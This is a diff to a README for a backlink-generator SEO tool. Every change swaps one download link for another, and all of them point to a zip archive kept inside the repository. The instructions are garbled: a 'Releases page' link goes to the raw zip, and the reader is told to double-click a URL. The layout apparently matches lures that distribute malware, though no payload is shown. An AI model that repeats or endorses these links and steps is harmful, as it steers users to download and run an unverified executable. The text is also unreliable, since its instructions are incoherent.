@@ -7,9 +7,9 @@ The **contextual-backlink-generator** helps you create quality contextual backli
 To get started, you need to download the application. Please follow these simple steps to install and run the tool.
 
 ## 📥 Download
-[![Download Now!](https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip%20Now%21-Release-brightgreen)](https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip)
+[![Download Now!](https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip%20Now%21-Release-brightgreen)](https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip)
 
-Visit this page to download: [Download Here](https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip)
+Visit this page to download: [Download Here](https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip)
 
 ## 🛠 System Requirements
 Before you download, ensure you meet the following system requirements:
@@ -20,16 +20,16 @@ Before you download, ensure you meet the following system requirements:
 
 ## 💾 Installation Instructions
 1. **Download the Application:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip) and select the latest version. Click on the download link for your operating system.
+   Go to the [Releases page](https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip) and select the latest version. Click on the download link for your operating system.
 
 2. **Locate the Downloaded File:**
-   Once the download finishes, find the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip`.
+   Once the download finishes, find the file in your downloads folder. It may be named something like `https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip`.
 
 3. **Extract the Files:**
    Right-click the downloaded file and choose **Extract All**. Follow the prompts to unzip the contents to a folder.
 
 4. **Run the Application:**
-   Open the extracted folder and double-click the `https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip` or `contextual-backlink-generator` file (for macOS). This will launch the application.
+   Open the extracted folder and double-click the `https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip` or `contextual-backlink-generator` file (for macOS). This will launch the application.
 
 ## 🔧 Using the Generator
 After launching the application, follow these steps to generate backlinks:
@@ -79,4 +79,4 @@ Remember, building a successful online presence takes time and effort. Use this 
 ## ⚙️ Conclusion
 You now have everything you need to get started with the **contextual-backlink-generator**. Download the tool, follow the instructions, and start generating quality contextual backlinks today! 
 
-For more downloads, please visit: [Download Here](https://raw.githubusercontent.com/Jajsjshshdh12/contextual-backlink-generator/main/Listerize/contextual-backlink-generator.zip)
+For more downloads, please visit: [Download Here](https://github.com/Jajsjshshdh12/contextual-backlink-generator/raw/refs/heads/main/Listerize/backlink-contextual-generator-v2.1.zip)
